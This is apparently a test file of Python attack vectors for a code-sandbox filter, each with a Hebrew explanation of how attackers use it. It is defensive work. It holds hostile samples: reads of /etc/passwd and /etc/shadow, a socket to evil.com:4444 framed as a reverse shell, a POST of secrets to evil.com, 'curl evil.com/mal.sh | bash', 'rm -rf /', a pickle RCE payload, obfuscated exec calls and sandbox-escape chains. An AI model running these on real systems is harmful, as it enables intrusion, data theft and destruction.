/**
 * Python Security Attack Vectors
 * 
 * Python is commonly used for scripting and has powerful system access capabilities.
 * These tests verify blocking of dangerous operations in Python code.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const pythonTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: os.system',
    code: `import os; os.system('whoami')`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: הרצת פקודות Shell ישירה

      איך האקרים משתמשים בזה:
      os.system() מעביר פקודה ל-shell להרצה.
      זו הדרך הפשוטה ביותר להריץ פקודות שרירותיות מתוך Python.

      השפעה בעולם אמיתי:
      - הרצת כל פקודת shell עם ההרשאות של השרת
      - הורדה והרצה של נוזקה: os.system('curl evil.com/mal.sh | bash')
      - מחיקת קבצים: os.system('rm -rf /')
      - שינוי הגדרות מערכת

      הערה היסטורית:
      זה אחד מווקטורי ה-RCE הנפוצים ביותר ב-Python, ונמצא
      באינספור CVEs ואירועי אבטחה.
    `,
  },
  {
    name: 'Python: os.popen',
    code: `import os; output = os.popen('ls -la').read()`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: הרצת פקודה עם לכידת פלט

      איך האקרים משתמשים בזה:
      os.popen() מריץ פקודה ומחזיר את הפלט שלה כאובייקט קובץ.
      תוקפים משתמשים בזה כדי ללכוד תוצאות פקודה לצורך הדלפה.

      השפעה בעולם אמיתי:
      - להריץ 'cat /etc/passwd' וללכוד את הפלט
      - לרשום תיקיות כדי למצוא קבצים בעלי ערך
      - להריץ פקודות ולעבד את הפלט שלהן בתוכנית
    `,
  },
  {
    name: 'Python: os.exec',
    code: `import os; os.execvp('sh', ['sh', '-c', 'whoami'])`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: החלפת תהליך באמצעות משפחת exec

      איך האקרים משתמשים בזה:
      פונקציות os.exec* מחליפות את התהליך הנוכחי בתהליך חדש.
      זה שימושי להרצת קבצים בינאריים ישירות בלי shell.

      השפעה בעולם אמיתי:
      - החלפת תהליך Python ב-shell
      - הרצת קבצים בינאריים ללא שכבת shell
      - קשה יותר למעקב כי התהליך מוחלף לחלוטין
    `,
  },
  {
    name: 'Python: os.spawn',
    code: `import os; os.spawnl(os.P_WAIT, '/bin/ls', 'ls', '-la')`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: יצירת תהליכים חדשים

      איך האקרים משתמשים בזה:
      פונקציות os.spawn* יוצרות תהליכים חדשים להרצת תוכנות.
      הן נותנות יותר שליטה מ-system() ומ-popen().

      השפעה בעולם אמיתי:
      - יצירת תהליכים מתמשכים, למשל backdoors
      - הרצת קבצים בינאריים עם ארגומנטים ספציפיים
      - שליטה במצב ההרצה של התהליך, כמו המתנה או הרצה מיידית
    `,
  },
  {
    name: 'Python: subprocess.run',
    code: `import subprocess; subprocess.run(['ls', '-la'])`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: הרצת Subprocess מודרנית

      איך האקרים משתמשים בזה:
      subprocess היא הדרך המומלצת ליצור תהליכים ב-Python מודרני.
      היא מספקת שליטה מלאה ב-stdin, stdout ו-stderr.

      השפעה בעולם אמיתי:
      - הרצת כל פקודת מערכת
      - לכידה ועיבוד של פלט
      - שרשור פקודות יחד
      - ממשק הרצת הפקודות הגמיש ביותר
    `,
  },
  {
    name: 'Python: subprocess.Popen',
    code: `from subprocess import Popen, PIPE; p = Popen('id', shell=True, stdout=PIPE)`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: שליטה אינטראקטיבית בתהליך

      איך האקרים משתמשים בזה:
      Popen מספק שליטה נמוכה בתהליכים עם pipes לתקשורת.
      הפרמטר shell=True מאפשר פרשנות של פקודות shell.

      השפעה בעולם אמיתי:
      - יצירת shells אינטראקטיביים
      - העברת נתונים בין תהליכים
      - תהליכי backdoor ארוכי-ריצה

      הערת אבטחה:
      shell=True מסוכן במיוחד כי הוא מאפשר שימוש בתווי shell מיוחדים.
    `,
  },
  {
    name: 'Python: subprocess.call',
    code: `import subprocess; subprocess.call('whoami', shell=True)`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: קריאת פקודה פשוטה

      איך האקרים משתמשים בזה:
      subprocess.call() הוא ממשק פשוט להרצת פקודות.
      הוא מחזיר את קוד היציאה של הפקודה שהורצה.

      השפעה בעולם אמיתי:
      - הרצת פקודות מהירה
      - בדיקה אם פקודות הצליחו
      - נפוץ בסקריפטים אוטומטיים של תקיפה
    `,
  },
  {
    name: 'Python: subprocess.check_output',
    code: `import subprocess; output = subprocess.check_output(['cat', '/etc/passwd'])`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: לכידת פלט פקודה

      איך האקרים משתמשים בזה:
      check_output() מריץ פקודה ומחזיר את הפלט שלה כ-bytes.
      הוא מעלה חריגה אם הפקודה נכשלת.

      השפעה בעולם אמיתי:
      - לכידת פלט אמינה לצורך גניבת מידע
      - טיפול שגיאות מובנה
      - נפוץ בסקריפטים להדלפת נתונים
    `,
  },
  {
    name: 'Python: commands module (legacy)',
    code: `import commands; commands.getoutput('id')`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 מתקפה: הרצת פקודות במודול Legacy

      איך האקרים משתמשים בזה:
      המודול commands הוסר/התיישן, אך עשוי להופיע במערכות ישנות.
      תוקפים מנסים כמה שיטות כדי להגדיל את סיכויי ההצלחה.

      השפעה בעולם אמיתי:
      - עובד במערכות Python 2.x ישנות
      - חלק מארגז כלים מקיף לתקיפה
      - קוד Legacy עדיין עשוי להשתמש בזה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CODE EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: exec function',
    code: `exec("import os; os.system('whoami')")`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 מתקפה: הרצת קוד דינמית באמצעות exec()

      איך האקרים משתמשים בזה:
      exec() מריץ קוד Python שרירותי מתוך מחרוזת.
      בשילוב עם ערפול, זהו וקטור תקיפה חזק מאוד.

      השפעה בעולם אמיתי:
      - הרצת קוד זדוני מעורפל
      - עקיפת ניתוח סטטי
      - מתקפות רב-שלביות, שבהן exec מוריד ומריץ payload

      דפוס נפוץ:
      exec(base64.decode(obfuscated_payload))
    `,
  },
  {
    name: 'Python: eval function',
    code: `eval("__import__('os').system('id')")`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 מתקפה: הערכת ביטוי עם __import__

      איך האקרים משתמשים בזה:
      eval() מעריך ביטוי Python. בשילוב עם __import__(),
      הוא יכול לייבא מודולים ולקרוא לפונקציות שלהם.

      השפעה בעולם אמיתי:
      - RCE בביטוי יחיד
      - נמצא לעיתים בפגיעויות Template Injection
      - נפוץ ב-SSTI, כלומר Server-Side Template Injection
    `,
  },
  {
    name: 'Python: compile function',
    code: `code = compile("import os; os.system('id')", '<string>', 'exec'); exec(code)`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 מתקפה: קומפילציה והרצה של קוד

      איך האקרים משתמשים בזה:
      compile() יוצר אובייקטי קוד שניתן להריץ מאוחר יותר.
      זה מפריד בין יצירת הקוד להרצה שלו, וכך יכול לעקוף חלק מהפילטרים.

      השפעה בעולם אמיתי:
      - הרצת קוד בשני שלבים
      - בדיקה או שינוי של אובייקט קוד
      - עקיפת חסימה של exec() באמצעות compile()
    `,
  },
  {
    name: 'Python: __import__ function',
    code: `__import__('os').system('id')`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 מתקפה: ייבוא מודולים דינמי

      איך האקרים משתמשים בזה:
      __import__() היא הפונקציה המובנית שמאחורי פקודת import.
      היא מאפשרת טעינת מודולים דינמית בזמן ריצה.

      השפעה בעולם אמיתי:
      - ייבוא מודולים מסוכנים באופן דינמי
      - עקיפת חסימה של פקודות import
      - רכיב בסיסי בבריחות Sandbox ב-Python
    `,
  },
  {
    name: 'Python: importlib',
    code: `import importlib; os = importlib.import_module('os'); os.system('id')`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 מתקפה: טעינת מודולים דרך importlib

      איך האקרים משתמשים בזה:
      importlib מספק שליטה תכנותית בייבוא מודולים.
      import_module() יכול לטעון כל מודול לפי שם.

      השפעה בעולם אמיתי:
      - חלופה ל-__import__()
      - מניפולציה חזקה יותר של מודולים
      - טעינה מחדש של מודולים לצורך התמדה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: open function',
    code: `f = open('/etc/passwd', 'r'); print(f.read())`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: קריאת קבצים ישירה

      איך האקרים משתמשים בזה:
      הפונקציה המובנית open() מספקת גישה חופשית לקבצים.
      תוקפים משתמשים בה כדי לקרוא קבצים רגישים.

      השפעה בעולם אמיתי:
      - קריאת /etc/passwd למיפוי משתמשים
      - גישה לקוד המקור של האפליקציה
      - קריאת קבצי תצורה עם סיסמאות
      - גישה למפתחות SSH ותעודות

      למה זה נחסם:
      בסביבת הרצת קוד מבודדת, גישה לקבצים צריכה להיות חסומה
      לחלוטין כדי למנוע דליפת מידע.
    `,
  },
  {
    name: 'Python: File write',
    code: `f = open('/tmp/backdoor.py', 'w'); f.write('malicious code'); f.close()`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: כתיבת קבצים זדוניים

      איך האקרים משתמשים בזה:
      כתיבת קבצים מאפשרת מתקפות מתמשכות - יצירת backdoors,
      שינוי קוד האפליקציה או שתילת נוזקה.

      השפעה בעולם אמיתי:
      - יצירת web shells לגישה מתמשכת
      - שינוי סקריפטים של Python כדי להחדיר backdoors
      - כתיבת cron jobs למתקפות מתוזמנות
      - שתילת מפתחות SSH לגישה עתידית
    `,
  },
  {
    name: 'Python: os.path operations',
    code: `import os.path; print(os.path.exists('/etc/shadow'))`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: סיור במערכת הקבצים

      איך האקרים משתמשים בזה:
      פונקציות os.path חושפות מידע על מערכת הקבצים
      בלי לקרוא קבצים ישירות.

      השפעה בעולם אמיתי:
      - בדיקה אם קבצים רגישים קיימים
      - מיפוי מבנה תיקיות
      - מציאת מיקומים ניתנים לכתיבה
      - זיהוי מטרות בעלות ערך
    `,
  },
  {
    name: 'Python: os.listdir',
    code: `import os; print(os.listdir('/'))`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: רשימת תיקיות

      איך האקרים משתמשים בזה:
      os.listdir() חושף את תוכן התיקייה ועוזר לתוקפים
      להבין את המערכת ולמצוא מטרות.

      השפעה בעולם אמיתי:
      - מיפוי קבצים בתיקיות רגישות
      - מציאת קבצי תצורה
      - גילוי מבנה האפליקציה
      - איתור קבצי גיבוי עם סיסמאות
    `,
  },
  {
    name: 'Python: pathlib',
    code: `from pathlib import Path; print(Path('/etc/passwd').read_text())`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: גישה לקבצים דרך pathlib מודרני

      איך האקרים משתמשים בזה:
      pathlib היא ספריית נתיבים מודרנית ומונחית-עצמים.
      read_text() ו-read_bytes() מספקות גישה קלה לקבצים.

      השפעה בעולם אמיתי:
      - כמו open(), רק דרך API אחר
      - עשוי לעקוף פילטרים שבודקים רק את open
      - תחביר נקי יותר לפעולות קבצים
    `,
  },
  {
    name: 'Python: shutil operations',
    code: `import shutil; shutil.copy('/etc/passwd', '/tmp/stolen.txt')`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: העתקה והעברה של קבצים

      איך האקרים משתמשים בזה:
      shutil מספק פעולות קבצים ברמה גבוהה כמו copy, move
      ופעולות רקורסיביות על תיקיות.

      השפעה בעולם אמיתי:
      - העתקת קבצים רגישים למיקומים נגישים
      - העברת קבצים כדי לשבש אפליקציות
      - העתקת תיקיות רקורסיבית לגניבה המונית
    `,
  },
  {
    name: 'Python: fileinput',
    code: `import fileinput; [print(l) for l in fileinput.input('/etc/passwd')]`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: איטרציה על קלט מקבצים

      איך האקרים משתמשים בזה:
      המודול fileinput עובר על קבצים, ולעיתים מפספסים אותו
      בפילטרי אבטחה.

      השפעה בעולם אמיתי:
      - שיטת קריאת קבצים חלופית
      - עיבוד כמה קבצים בבת אחת
      - שינוי קבצים במקום
    `,
  },
  {
    name: 'Python: io module',
    code: `import io; f = io.open('/etc/passwd'); print(f.read())`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 מתקפה: גישה לקבצים דרך מודול io

      איך האקרים משתמשים בזה:
      io.open() זהה ל-open() המובנה, אך מגיע במפורש
      ממודול io. הוא עשוי לעקוף פילטרים נאיביים.

      השפעה בעולם אמיתי:
      - חלופה ל-open()
      - תמיכה במצב בינארי וטקסטואלי
      - שליטה בבאפרים לקבצים גדולים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: socket connection',
    code: `import socket; s = socket.socket(); s.connect(('evil.com', 4444))`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: חיבור Socket גולמי Reverse Shell

      איך האקרים משתמשים בזה:
      מודול socket מאפשר חיבורי רשת גולמיים. השימוש הנפוץ ביותר
      הוא יצירת reverse shells.

      השפעה בעולם אמיתי:
      - Reverse shell: ה-socket מתחבר לתוקף ושולח קלט/פלט של shell
      - הדלפת נתונים בפרוטוקולים מותאמים
      - סריקת פורטים וסיור ברשת

      דפוס קלאסי:
      socket.connect(attacker) → os.dup2(socket, stdin/stdout) → exec('/bin/sh')
    `,
  },
  {
    name: 'Python: urllib request',
    code: `from urllib.request import urlopen; print(urlopen('https://evil.com').read())`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: הדלפת נתונים דרך HTTP

      איך האקרים משתמשים בזה:
      urllib מספק יכולות לקוח HTTP לשליפת כתובות URL
      או לשליחת נתונים לשרתים חיצוניים.

      השפעה בעולם אמיתי:
      - הורדת payloads זדוניים
      - הדלפת מידע גנוב דרך HTTP
      - beacon לשרתי C2
      - מתקפות SSRF, כלומר Server-Side Request Forgery
    `,
  },
  {
    name: 'Python: http.client',
    code: `import http.client; conn = http.client.HTTPConnection('evil.com')`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: לקוח HTTP ברמה נמוכה

      איך האקרים משתמשים בזה:
      http.client מספק שליטה מפורטת בבקשות HTTP.
      שימושי לבקשות מותאמות ולפרוטוקולים מיוחדים.

      השפעה בעולם אמיתי:
      - שליחת בקשות HTTP מותאמות
      - הדלפת נתונים בכותרות HTTP
      - מתקפות HTTP smuggling
    `,
  },
  {
    name: 'Python: ftplib',
    code: `from ftplib import FTP; ftp = FTP('evil.com')`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: העברת קבצים דרך FTP

      איך האקרים משתמשים בזה:
      FTP יכול לשמש להעלאת קבצים גנובים או להורדת
      נוזקה משרתי התוקף.

      השפעה בעולם אמיתי:
      - הדלפת קבצים דרך FTP
      - הורדת כלים נוספים
      - פרוטוקול מסורתי שעשוי לעקוף פילטרי Web
    `,
  },
  {
    name: 'Python: smtplib',
    code: `import smtplib; s = smtplib.SMTP('mail.evil.com')`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: הדלפה דרך אימייל

      איך האקרים משתמשים בזה:
      smtplib יכול לשלוח אימיילים עם מידע גנוב.
      אימיילים לעיתים עוקפים ניטור רשת.

      השפעה בעולם אמיתי:
      - שליחת סיסמאות וסודות לתוקף
      - שימוש בשרת כ-spam relay
      - ערוץ סמוי להדלפת נתונים
    `,
  },
  {
    name: 'Python: requests library',
    code: `import requests; requests.post('https://evil.com/collect', json={'secrets': 'data'})`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 מתקפה: ספריית בקשות HTTP

      איך האקרים משתמשים בזה:
      requests היא ספריית ה-HTTP הפופולרית ביותר ב-Python.
      יש לה API פשוט להדלפת נתונים.

      השפעה בעולם אמיתי:
      - הדלפת payloads בפורמט JSON
      - אינטראקציה קלה עם APIs
      - טיפול ב-cookies וב-sessions לבקשות מאומתות
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: os.environ',
    code: `import os; print(os.environ)`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: גניבת משתני סביבה

      איך האקרים משתמשים בזה:
      os.environ מכיל את כל משתני הסביבה, שלרוב כוללים
      תצורה רגישה והרשאות.

      השפעה בעולם אמיתי:
      - גניבת מפתחות API כמו AWS_SECRET_ACCESS_KEY
      - קבלת סיסמאות בסיסי נתונים
      - מציאת JWT secrets
      - גישה להרשאות ענן
    `,
  },
  {
    name: 'Python: os.getcwd',
    code: `import os; print(os.getcwd())`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: חשיפת נתיב עבודה

      איך האקרים משתמשים בזה:
      ידיעת תיקיית העבודה עוזרת לתוקפים להבין
      את מבנה האפליקציה ולתכנן מתקפות המשך.

      השפעה בעולם אמיתי:
      - חשיפת נתיבי שרת
      - סיוע במתקפות Path Traversal
      - איסוף מידע
    `,
  },
  {
    name: 'Python: platform info',
    code: `import platform; print(platform.system(), platform.release())`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: זיהוי מערכת

      איך האקרים משתמשים בזה:
      מודול platform חושף פרטי מערכת הפעלה שימושיים
      לבחירת exploit ממוקד.

      השפעה בעולם אמיתי:
      - זיהוי מערכת ההפעלה למתקפות ממוקדות
      - מציאת גרסת kernel עבור exploits
      - זיהוי ארכיטקטורת המערכת
    `,
  },
  {
    name: 'Python: sys.exit',
    code: `import sys; sys.exit(1)`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: מניעת שירות

      איך האקרים משתמשים בזה:
      sys.exit() מסיים את התהליך וגורם לשיבוש השירות.

      השפעה בעולם אמיתי:
      - הפלת האפליקציה
      - שיבוש שירות למשתמשים
      - טשטוש עקבות באמצעות סיום לפני כתיבת לוגים
    `,
  },
  {
    name: 'Python: getpass module',
    code: `import getpass; print(getpass.getuser())`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: איסוף מידע על המשתמש

      איך האקרים משתמשים בזה:
      getpass חושף את המשתמש הנוכחי, מידע שימושי
      לתקיפות ממוקדות ולמיפוי הרשאות.

      השפעה בעולם אמיתי:
      - זיהוי המשתמש שמריץ את התהליך
      - מיקוד בתיקיות משתמש ספציפיות
      - סיוע בהעלאת הרשאות
    `,
  },
  {
    name: 'Python: ctypes',
    code: `import ctypes; ctypes.CDLL('libc.so.6')`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: טעינת קוד Native

      איך האקרים משתמשים בזה:
      ctypes מאפשר טעינת ספריות משותפות וקריאה לפונקציות C,
      וכך עוקף את מנגנוני הבטיחות של Python.

      השפעה בעולם אמיתי:
      - טעינת shared libraries זדוניות
      - קריאה ישירה לפונקציות מערכת
      - עקיפה מלאה של sandboxing ב-Python
      - מניפולציה בזיכרון
    `,
  },
  {
    name: 'Python: multiprocessing',
    code: `from multiprocessing import Process; Process(target=lambda: __import__('os').system('id')).start()`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: יצירת תהליכים להתמדה

      איך האקרים משתמשים בזה:
      multiprocessing יוצר תהליכי child שיכולים להמשיך לפעול
      גם אחרי סיום תהליך האב.

      השפעה בעולם אמיתי:
      - יצירת backdoors מתמשכים
      - fork bomb למניעת שירות
      - מתקפות מקביליות
    `,
  },
  {
    name: 'Python: threading',
    code: `import threading; threading.Thread(target=lambda: __import__('os').system('id')).start()`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 מתקפה: הרצת קוד ברקע דרך Threads

      איך האקרים משתמשים בזה:
      Threads רצים במקביל ועלולים להריץ קוד זדוני
      ברקע.

      השפעה בעולם אמיתי:
      - הרצת נוזקה ברקע
      - התחמקות מניטור חד-תהליכי
      - עיבוד נתונים מקבילי
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // PICKLE/SERIALIZATION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: pickle deserialization',
    code: `import pickle; pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")`,
    expectBlocked: true,
    category: 'deserialization',
    explanation: `
      🎯 מתקפה: RCE דרך Deserialization של Pickle

      איך האקרים משתמשים בזה:
      pickle יכול להריץ קוד שרירותי בזמן deserialization.
      payloads זדוניים של pickle משיגים RCE כאשר עושים להם unpickle.

      השפעה בעולם אמיתי:
      - פגיעות deserialization קלאסית ב-Python
      - ה-payload המוצג מריץ os.system('id')
      - נפוץ באפליקציות Web שמקבלות נתונים מקודדים ב-pickle

      אזהרה:
      לעולם אל תעשה unpickle לנתונים ממקור לא מהימן!
    `,
  },
  {
    name: 'Python: marshal',
    code: `import marshal; marshal.loads(b'data')`,
    expectBlocked: true,
    category: 'deserialization',
    explanation: `
      🎯 מתקפה: טעינת אובייקטי קוד דרך marshal

      איך האקרים משתמשים בזה:
      marshal מבצע deserialization לאובייקטי קוד של Python.
      הוא יכול לטעון bytecode זדוני מקומפל.

      השפעה בעולם אמיתי:
      - טעינת קוד זדוני שכבר קומפל
      - עקיפת ניתוח קוד מקור
      - הרצת payloads מעורפלים
    `,
  },
  {
    name: 'Python: shelve',
    code: `import shelve; db = shelve.open('/tmp/evil')`,
    expectBlocked: true,
    category: 'deserialization',
    explanation: `
      🎯 מתקפה: אובייקטים מתמידים דרך shelve

      איך האקרים משתמשים בזה:
      shelve משתמש ב-pickle מאחורי הקלעים, ולכן יורש את אותן פגיעויות.
      הוא יוצר אחסון מתמשך שיכול להכיל אובייקטים זדוניים.

      השפעה בעולם אמיתי:
      - אחסון pickle מתמשך
      - אותם סיכוני RCE כמו pickle
      - התמדה של תקיפה דרך קבצים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: base64 decode bypass',
    code: `import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 מתקפה: Payload מקודד Base64

      איך האקרים משתמשים בזה:
      קידוד Base64 מסתיר קוד זדוני מפילטרים פשוטים.
      המחרוזת המקודדת מתורגמת ל: import os; os.system('id')

      השפעה בעולם אמיתי:
      - עקיפת פילטרים מבוססי תבניות
      - הסתרת payload במחרוזות שנראות אקראיות
      - טכניקת ערפול סטנדרטית בנוזקות
    `,
  },
  {
    name: 'Python: chr() bypass',
    code: `exec(''.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116)]))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 מתקפה: ערפול באמצעות קודי תווים

      איך האקרים משתמשים בזה:
      בניית מחרוזות מקודי chr() מסתירה מילים שמורות מפילטרים.
      chr(105),chr(109)... יוצר את המילה 'import'.

      השפעה בעולם אמיתי:
      - עקיפת פילטרים לפי מילים שמורות
      - כל תו מיוצג כמספר
      - נפוץ באתגרי CTF וב-exploits
    `,
  },
  {
    name: 'Python: hex decode bypass',
    code: `exec(bytes.fromhex('696d706f7274206f73').decode())`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 מתקפה: Payload מקודד Hex

      איך האקרים משתמשים בזה:
      קידוד Hex הוא חלופה ל-Base64 להסתרת קוד.
      '696d706f7274206f73' = 'import os'

      השפעה בעולם אמיתי:
      - חלופה ל-Base64
      - עקיפת פילטרים שמזהים רק Base64
      - פחות חשוד ממחרוזות Base64
    `,
  },
  {
    name: 'Python: codecs bypass',
    code: `import codecs; exec(codecs.decode('vzcbeg bf', 'rot_13'))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 מתקפה: ערפול ROT13 / Codec

      איך האקרים משתמשים בזה:
      מודול codecs תומך בקידודים שונים כולל rot_13.
      'vzcbeg bf' ב-rot_13 הוא 'import os'.

      השפעה בעולם אמיתי:
      - אפשרויות קידוד מרובות
      - rot_13 הוא החלפת אותיות פשוטה
      - ניתן לשרשר כמה קידודים יחד
    `,
  },
  {
    name: 'Python: zlib decompress bypass',
    code: `import zlib; exec(zlib.decompress(b'x\\x9c+\\xca\\xcc+\\xd1H\\xcf\\xc9OH\\xcc)f\\x00\\x00\\x1e\\x06\\x04\\xa3'))`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 מתקפה: Payload דחוס

      איך האקרים משתמשים בזה:
      דחיסה מסתירה קוד ומקטינה את גודל ה-payload.
      הנתונים הדחוסים נפתחים לקוד זדוני.

      השפעה בעולם אמיתי:
      - payload קטן יותר להזרקה
      - קשה יותר לזהות תבניות
      - נתונים בינאריים נראים כמו רעש אקראי
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // INTROSPECTION/REFLECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Python: globals() access',
    code: `print(globals())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: גישה ל-Global Namespace

      איך האקרים משתמשים בזה:
      globals() מחזיר את טבלת הסמלים הגלובלית, כולל מודולים
      ופונקציות שיובאו.

      השפעה בעולם אמיתי:
      - גילוי מודולים זמינים
      - גישה ל-__builtins__ עבור פונקציות מסוכנות
      - מציאת סודות של האפליקציה ב-globals
    `,
  },
  {
    name: 'Python: locals() access',
    code: `print(locals())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: גישה ל-Local Namespace

      איך האקרים משתמשים בזה:
      locals() חושף משתנים מקומיים שעשויים להכיל
      מידע רגיש או הפניות שימושיות.

      השפעה בעולם אמיתי:
      - מציאת משתנים עם סודות
      - גילוי מודולים שיובאו מקומית
      - דליפת מידע
    `,
  },
  {
    name: 'Python: vars() access',
    code: `print(vars())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: גישה למילון משתנים

      איך האקרים משתמשים בזה:
      vars() מחזיר את __dict__ של אובייקט או של ה-local namespace.
      כך נחשף מצב פנימי של אובייקטים.

      השפעה בעולם אמיתי:
      - גישה לפנימיות של אובייקטים
      - שינוי תכונות פרטיות
      - דומה ל-globals()/locals()
    `,
  },
  {
    name: 'Python: dir() enumeration',
    code: `print(dir(__builtins__))`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: מיפוי Attributes

      איך האקרים משתמשים בזה:
      dir() מציג את כל ה-attributes של אובייקט.
      משתמשים בו כדי לגלות פונקציות ומתודות זמינות.

      השפעה בעולם אמיתי:
      - מיפוי פונקציות זמינות
      - מציאת יכולות לא מתועדות
      - מיפוי ממשקי אובייקטים
    `,
  },
  {
    name: 'Python: getattr dynamic access',
    code: `getattr(__builtins__, '__import__')('os').system('id')`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: גישה דינמית ל-Attributes

      איך האקרים משתמשים בזה:
      getattr() שולף attributes לפי שם, וכך מאפשר גישה דינמית
      לפונקציות מסוכנות.

      השפעה בעולם אמיתי:
      - גישה דינמית ל-attributes חסומים
      - עקיפת חסימה של גישה ישירה
      - טכניקת בסיס בבריחות Sandbox
    `,
  },
  {
    name: 'Python: __subclasses__ traversal',
    code: `print(().__class__.__bases__[0].__subclasses__())`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: מעבר בהיררכיית המחלקות

      איך האקרים משתמשים בזה:
      __subclasses__() מחזיר את כל תתי-המחלקות של מחלקה.
      משתמשים בו כדי למצוא מחלקות עם יכולות מסוכנות.

      השפעה בעולם אמיתי:
      - מציאת מחלקות עם גישה לקבצים, כמו FileLoader
      - איתור מחלקות עם מתודות להרצת קוד
      - בריחת Sandbox קלאסית ב-Python

      דפוס נפוץ:
      tuple.__mro__[1].__subclasses__() → find os._wrap_close → access os
    `,
  },
  {
    name: 'Python: __mro__ traversal',
    code: `print(().__class__.__mro__)`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: מעבר ב-Method Resolution Order

      איך האקרים משתמשים בזה:
      __mro__ מציג את שרשרת הירושה. יחד עם __subclasses__,
      הוא מאפשר מעבר בכל היררכיית המחלקות.

      השפעה בעולם אמיתי:
      - ניווט למחלקת הבסיס object
      - מציאת כל המחלקות במערכת
      - שער גישה למחלקות מסוכנות
    `,
  },
  {
    name: 'Python: __builtins__ access',
    code: `print(__builtins__)`,
    expectBlocked: true,
    category: 'introspection',
    explanation: `
      🎯 מתקפה: גישה למודול Builtins

      איך האקרים משתמשים בזה:
      __builtins__ מכיל את כל הפונקציות המובנות, כולל
      פונקציות מסוכנות כמו __import__, eval, exec.

      השפעה בעולם אמיתי:
      - גישה לפונקציות מובנות מסוכנות
      - גם כאשר שמות ישירים נחסמים
      - __builtins__.__import__ הוא bypass נפוץ
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // AST/CODE OBJECT ATTACKS
